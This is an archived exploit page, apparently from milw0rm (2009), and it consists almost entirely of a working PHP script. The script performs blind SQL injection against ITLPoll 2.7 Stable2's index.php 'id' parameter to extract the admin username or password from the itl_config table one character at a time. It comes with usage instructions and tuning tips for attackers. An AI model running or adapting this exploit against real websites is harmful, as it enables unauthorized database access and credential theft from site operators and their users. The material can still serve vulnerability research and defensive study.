<html><head><title>ITLPoll 2.7 Stable2 (index.php id) Blind SQL Injection Exploit</title></head><pre>&lt;?php

function usage ()
{
    echo &quot;\nITLPoll v2.7 Stable2 Blind SQL Injection Exploit&quot;.
         &quot;\n[☢] Usage   : ./itlpoll.php hostname path &lt;username or password&gt;&quot;.
         &quot;\n[☢] Ex	: ./itlpoll.php localhost /itlpoll password&quot;.
	 &quot;\n\n&quot;;
    exit ();
}


function query ($func, $chr, $pos)
{   //replace 1' with a valid poll number if you have problems. See hostname/path/?Archive for a list of polls.
    $query = &quot;1' AND ORD(MID((SELECT IFNULL(CAST({$func} AS CHAR(10000)), CHAR(32)) FROM itl_config WHERE id = 1),{$pos},1))='{$chr}&quot;;
    $query = str_replace (&quot; &quot;, &quot;%20&quot;, $query);
    $query = str_replace (&quot;'&quot;, &quot;%27&quot;, $query);
    return $query;
}

function exploit ($host, $path, $func, $pos, $chr)
{
    $chr = ord ($chr);
    $fp = fsockopen ($host, 80);
    $query = query ($func, $chr, $pos);
    $request = &quot;GET {$path}/index.php?id={$query} HTTP/1.1\r\n&quot;.
           &quot;Host: {$host}\r\n&quot;.
           &quot;Connection: Close\r\n\r\n&quot;;
    
    fputs ($fp, $request);
    while (!feof ($fp))
        $reply .= fgets ($fp, 1024);
    
    fclose ($fp);

    if (preg_match (&quot;/EXPIERED/&quot;, $reply))
        return false;
    else
        return true;
}


if ($argc != 4)

    usage ();

$host = $argv [1];
$path = $argv [2];
$func = $argv [3];
$key = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&quot;; //add a bigger char set if you can't get the username
$pos = 1;
$chr = 0;

echo &quot;[☢] Creds: &quot;;

while ($pos &lt;= 32)
{
    if (exploit ($host, $path, $func, $pos, $key [$chr]))
    {
        echo $key [$chr];
        $chr = 0;
        $pos++;
    }
    else
        $chr++;
}
echo &quot;\n&quot;;
?&gt;

# milw0rm.com [2009-01-26]</pre></html>